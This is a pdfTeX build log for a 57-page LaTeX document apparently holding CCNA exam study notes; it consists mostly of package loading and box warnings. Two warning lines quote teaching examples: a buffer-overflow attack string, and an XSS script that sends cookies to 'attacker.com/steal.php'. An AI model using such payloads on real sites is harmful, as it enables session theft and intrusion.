This is pdfTeX, Version 3.141592653-2.6-1.40.26 (TeX Live 2024) (preloaded format=pdflatex 2024.6.3)  27 JUN 2024 09:11
entering extended mode
 restricted \write18 enabled.
 %&-line parsing enabled.
**200-301CCNA.tex
(./200-301CCNA.tex
LaTeX2e <2024-06-01>
L3 programming layer <2024-05-08>
(/usr/local/texlive/2024/texmf-dist/tex/latex/base/article.cls
Document Class: article 2024/02/08 v1.4n Standard LaTeX document class
(/usr/local/texlive/2024/texmf-dist/tex/latex/base/size10.clo
File: size10.clo 2024/02/08 v1.4n Standard LaTeX file (size option)
)
\c@part=\count194
\c@section=\count195
\c@subsection=\count196
\c@subsubsection=\count197
\c@paragraph=\count198
\c@subparagraph=\count199
\c@figure=\count266
\c@table=\count267
\abovecaptionskip=\skip49
\belowcaptionskip=\skip50
\bibindent=\dimen141
)
(/usr/local/texlive/2024/texmf-dist/tex/latex/enumitem/enumitem.sty
Package: enumitem 2019/06/20 v3.9 Customized lists
\enitkv@toks@=\toks17
\labelindent=\skip51
\enit@outerparindent=\dimen142
\enit@toks=\toks18
\enit@inbox=\box52
\enit@count@id=\count268
\enitdp@description=\count269
)
(/usr/local/texlive/2024/texmf-dist/tex/latex/amsmath/amsmath.sty
Package: amsmath 2024/05/23 v2.17q AMS math features
\@mathmargin=\skip52

For additional information on amsmath, use the `?' option.
(/usr/local/texlive/2024/texmf-dist/tex/latex/amsmath/amstext.sty
Package: amstext 2021/08/26 v2.01 AMS text

(/usr/local/texlive/2024/texmf-dist/tex/latex/amsmath/amsgen.sty
File: amsgen.sty 1999/11/30 v2.0 generic functions
\@emptytoks=\toks19
\ex@=\dimen143
))
(/usr/local/texlive/2024/texmf-dist/tex/latex/amsmath/amsbsy.sty
Package: amsbsy 1999/11/29 v1.2d Bold Symbols
\pmbraise@=\dimen144
)
(/usr/local/texlive/2024/texmf-dist/tex/latex/amsmath/amsopn.sty
Package: amsopn 2022/04/08 v2.04 operator names
)
\inf@bad=\count270
LaTeX Info: Redefining \frac on input line 233.
\uproot@=\count271
\leftroot@=\count272
LaTeX Info: Redefining \overline on input line 398.
LaTeX Info: Redefining \colon on input line 409.
\classnum@=\count273
\DOTSCASE@=\count274
LaTeX Info: Redefining \ldots on input line 495.
LaTeX Info: Redefining \dots on input line 498.
LaTeX Info: Redefining \cdots on input line 619.
\Mathstrutbox@=\box53
\strutbox@=\box54
LaTeX Info: Redefining \big on input line 721.
LaTeX Info: Redefining \Big on input line 722.
LaTeX Info: Redefining \bigg on input line 723.
LaTeX Info: Redefining \Bigg on input line 724.
\big@size=\dimen145
LaTeX Font Info:    Redeclaring font encoding OML on input line 742.
LaTeX Font Info:    Redeclaring font encoding OMS on input line 743.
\macc@depth=\count275
LaTeX Info: Redefining \bmod on input line 904.
LaTeX Info: Redefining \pmod on input line 909.
LaTeX Info: Redefining \smash on input line 939.
LaTeX Info: Redefining \relbar on input line 969.
LaTeX Info: Redefining \Relbar on input line 970.
\c@MaxMatrixCols=\count276
\dotsspace@=\muskip17
\c@parentequation=\count277
\dspbrk@lvl=\count278
\tag@help=\toks20
\row@=\count279
\column@=\count280
\maxfields@=\count281
\andhelp@=\toks21
\eqnshift@=\dimen146
\alignsep@=\dimen147
\tagshift@=\dimen148
\tagwidth@=\dimen149
\totwidth@=\dimen150
\lineht@=\dimen151
\@envbody=\toks22
\multlinegap=\skip53
\multlinetaggap=\skip54
\mathdisplay@stack=\toks23
LaTeX Info: Redefining \[ on input line 2953.
LaTeX Info: Redefining \] on input line 2954.
)
(/usr/local/texlive/2024/texmf-dist/tex/latex/l3backend/l3backend-pdftex.def
File: l3backend-pdftex.def 2024-05-08 L3 backend support: PDF output (pdfTeX)
\l__color_backend_stack_int=\count282
\l__pdf_internal_box=\box55
)
(./200-301CCNA.aux)
\openout1 = `200-301CCNA.aux'.

LaTeX Font Info:    Checking defaults for OML/cmm/m/it on input line 9.
LaTeX Font Info:    ... okay on input line 9.
LaTeX Font Info:    Checking defaults for OMS/cmsy/m/n on input line 9.
LaTeX Font Info:    ... okay on input line 9.
LaTeX Font Info:    Checking defaults for OT1/cmr/m/n on input line 9.
LaTeX Font Info:    ... okay on input line 9.
LaTeX Font Info:    Checking defaults for T1/cmr/m/n on input line 9.
LaTeX Font Info:    ... okay on input line 9.
LaTeX Font Info:    Checking defaults for TS1/cmr/m/n on input line 9.
LaTeX Font Info:    ... okay on input line 9.
LaTeX Font Info:    Checking defaults for OMX/cmex/m/n on input line 9.
LaTeX Font Info:    ... okay on input line 9.
LaTeX Font Info:    Checking defaults for U/cmr/m/n on input line 9.
LaTeX Font Info:    ... okay on input line 9.


[1

{/usr/local/texlive/2024/texmf-var/fonts/map/pdftex/updmap/pdftex.map}{/usr/loc
al/texlive/2024/texmf-dist/fonts/enc/dvips/cm-super/cm-super-ts1.enc}]
Underfull \hbox (badness 10000) in paragraph at lines 29--30

 []


Underfull \hbox (badness 10000) in paragraph at lines 30--31

 []


Underfull \hbox (badness 10000) in paragraph at lines 31--32

 []


Underfull \hbox (badness 10000) in paragraph at lines 33--34

 []


Underfull \hbox (badness 10000) in paragraph at lines 35--36

 []


Underfull \hbox (badness 10000) in paragraph at lines 37--38

 []



[2]
Underfull \hbox (badness 10000) in paragraph at lines 45--47

 []


Underfull \hbox (badness 10000) in paragraph at lines 48--49

 []


Underfull \hbox (badness 10000) in paragraph at lines 50--51

 []


Underfull \hbox (badness 10000) in paragraph at lines 52--53

 []



[3]

[4]

[5]
Underfull \hbox (badness 10000) in paragraph at lines 81--87

 []



[6]
Underfull \hbox (badness 10000) in paragraph at lines 95--96

 []


Overfull \hbox (0.55603pt too wide) in paragraph at lines 96--100
\OT1/cmr/m/n/10 Receiver's ad-ver-tised win-dow in-di-cates the re-ceiver's ava
il-able buffer space,
 []


Underfull \hbox (badness 10000) in paragraph at lines 96--100

 []


Underfull \hbox (badness 10000) in paragraph at lines 105--110

 []



[7]
Overfull \hbox (7.27724pt too wide) in paragraph at lines 110--115
\OT1/cmr/m/n/10 Congestion Con-trol Al-go-rithms: Be-sides Reno, TCP also in-cl
udes NewReno,
 []


Underfull \hbox (badness 10000) in paragraph at lines 110--115

 []

LaTeX Font Info:    Trying to load font information for OML+cmr on input line 1
19.
(/usr/local/texlive/2024/texmf-dist/tex/latex/base/omlcmr.fd
File: omlcmr.fd 2023/04/13 v2.5m Standard LaTeX font definitions
)
LaTeX Font Info:    Font shape `OML/cmr/m/n' in size <10> not available
(Font)              Font shape `OML/cmm/m/it' tried instead on input line 119.


[8]

[9]
Overfull \hbox (13.61742pt too wide) in paragraph at lines 148--149
[]\OT1/cmr/m/n/10 configure: Router(config-if)# ipv6 ad-dress \OML/cmm/m/it/10 
<\OT1/cmr/m/n/10 IPv6[]address\OML/cmm/m/it/10 >\OT1/cmr/m/n/10 /\OML/cmm/m/it/
10 <\OT1/cmr/m/n/10 prefix[]length\OML/cmm/m/it/10 > 
 []


Underfull \hbox (badness 10000) in paragraph at lines 152--156

 []


Underfull \hbox (badness 10000) in paragraph at lines 156--157

 []


Underfull \hbox (badness 10000) in paragraph at lines 157--158

 []


Underfull \hbox (badness 10000) in paragraph at lines 158--159

 []



[10]

[11]

[12]

[13]

[14]
Underfull \hbox (badness 10000) in paragraph at lines 247--250

 []



[15]

[16]

[17]

[18]

[19]

[20]
Overfull \hbox (6.54967pt too wide) in paragraph at lines 268--269
[]\OT1/cmr/bx/n/10 Describe net-work de-vice man-age-ment ac-cess (Tel-net, SSH
, HTTP,
 []



[21]
Underfull \hbox (badness 10000) in paragraph at lines 276--277

 []



[22]

[23]

[24]

[25]
Underfull \hbox (badness 10000) in paragraph at lines 342--345

 []


Underfull \hbox (badness 10000) in paragraph at lines 346--349

 []


Underfull \hbox (badness 10000) in paragraph at lines 350--352

 []


Underfull \hbox (badness 10000) in paragraph at lines 353--354

 []


Underfull \hbox (badness 10000) in paragraph at lines 355--356

 []



[26]

[27]
Underfull \hbox (badness 10000) in paragraph at lines 378--382

 []


Underfull \hbox (badness 10000) in paragraph at lines 391--392

 []



[28]
Overfull \hbox (36.13847pt too wide) in paragraph at lines 420--421
[]\OT1/cmr/m/n/10 DNS is a dis-tributed sys-tem that trans-lates do-main names 
(like www.example.com)
 []



[29]

[30]
Underfull \hbox (badness 10000) in paragraph at lines 428--431

 []



[31]

[32]

[33]

[34]

[35]

[36]

[37]

[38]
LaTeX Font Info:    Trying to load font information for OMS+cmr on input line 4
90.
 (/usr/local/texlive/2024/texmf-dist/tex/latex/base/omscmr.fd
File: omscmr.fd 2023/04/13 v2.5m Standard LaTeX font definitions
)
LaTeX Font Info:    Font shape `OMS/cmr/m/n' in size <10> not available
(Font)              Font shape `OMS/cmsy/m/n' tried instead on input line 490.

Overfull \hbox (70.61205pt too wide) in paragraph at lines 486--506
\OT1/cmr/m/n/10 int main() char at-tack-String[30] = "AAAAAAAAAAAAAAAAAAAA\OMS/
cmsy/m/n/10 n\OT1/cmr/m/n/10 xef\OMS/cmsy/m/n/10 n\OT1/cmr/m/n/10 xbe\OMS/cmsy/
m/n/10 n\OT1/cmr/m/n/10 xad\OMS/cmsy/m/n/10 n\OT1/cmr/m/n/10 xde";
 []


Overfull \hbox (43.7045pt too wide) in paragraph at lines 486--506
\OML/cmm/m/it/10 <\OT1/cmr/m/n/10 script\OML/cmm/m/it/10 >\OT1/cmr/m/n/10 var i
mg = new Im-age(); img.src = 'http://attacker.com/steal.php?cookie='
 []



[39]

[40]
Overfull \hbox (2.83394pt too wide) in paragraph at lines 523--530
\OT1/cmr/m/n/10 Skill De-vel-op-ment: Equips em-ploy-ees with skills to han-dle
 emerg-ing threats
 []



[41]
Underfull \hbox (badness 10000) in paragraph at lines 539--541

 []


Underfull \hbox (badness 10000) in paragraph at lines 542--543

 []


Underfull \hbox (badness 10000) in paragraph at lines 544--547

 []



[42]
Overfull \hbox (1.47272pt too wide) in paragraph at lines 558--559
[]\OT1/cmr/m/n/10 Password com-plex-ity re-quire-ments are de-signed to strengt
hen the re-silience
 []



[43]

[44]
Overfull \hbox (16.16743pt too wide) in paragraph at lines 568--570
\OT1/cmr/m/n/10 R1(config)# access-list 101 per-mit tcp 172.16.1.0 0.0.0.255 17
2.16.3.0 0.0.0.255
 []



[45]

[46]

[47]

[48]
Underfull \hbox (badness 10000) in paragraph at lines 638--639

 []



[49]

[50]

[51]

[52]

[53]
Overfull \hbox (5.75067pt too wide) in paragraph at lines 696--697
[]\OT1/cmr/m/n/10 Mitigating Strate-gies: data gov-er-nance, hy-brid ap-proches
, con-tin-u-ous learn-
 []



[54]

[55]
Underfull \hbox (badness 10000) in paragraph at lines 730--731

 []


Underfull \hbox (badness 10000) in paragraph at lines 730--731

 []


Underfull \hbox (badness 10000) in paragraph at lines 730--731

 []


Underfull \hbox (badness 10000) in paragraph at lines 730--731

 []


Underfull \hbox (badness 10000) in paragraph at lines 730--731

 []


Underfull \hbox (badness 10000) in paragraph at lines 730--731

 []


Underfull \hbox (badness 10000) in paragraph at lines 730--731

 []


Underfull \hbox (badness 10000) in paragraph at lines 730--731

 []



[56]
Underfull \hbox (badness 10000) in paragraph at lines 738--739

 []



[57] (./200-301CCNA.aux)
 ***********
LaTeX2e <2024-06-01>
L3 programming layer <2024-05-08>
 ***********
 ) 
Here is how much of TeX's memory you used:
 1551 strings out of 473600
 24337 string characters out of 5728709
 1942890 words of memory out of 5000000
 24466 multiletter control sequences out of 15000+600000
 563826 words of font info for 56 fonts, out of 8000000 for 9000
 1141 hyphenation exceptions out of 8191
 56i,6n,65p,6766b,234s stack positions out of 10000i,1000n,20000p,200000b,200000s
</usr/local/texlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmbx10.pfb
></usr/local/texlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmbx12.pfb>
</usr/local/texlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmex10.pfb><
/usr/local/texlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmmi10.pfb></
usr/local/texlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmmi7.pfb></us
r/local/texlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmr10.pfb></usr/
local/texlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmr12.pfb></usr/lo
cal/texlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmr17.pfb></usr/loca
l/texlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmr7.pfb></usr/local/t
exlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmsy10.pfb></usr/local/te
xlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmsy7.pfb></usr/local/texl
ive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmti10.pfb></usr/local/texli
ve/2024/texmf-dist/fonts/type1/public/cm-super/sfrm1000.pfb>
Output written on 200-301CCNA.pdf (57 pages, 295097 bytes).
PDF statistics:
 255 PDF objects out of 1000 (max. 8388607)
 168 compressed objects within 2 object streams
 0 named destinations out of 1000 (max. 500000)
 1 words of extra memory for PDF output out of 10000 (max. 10000000)

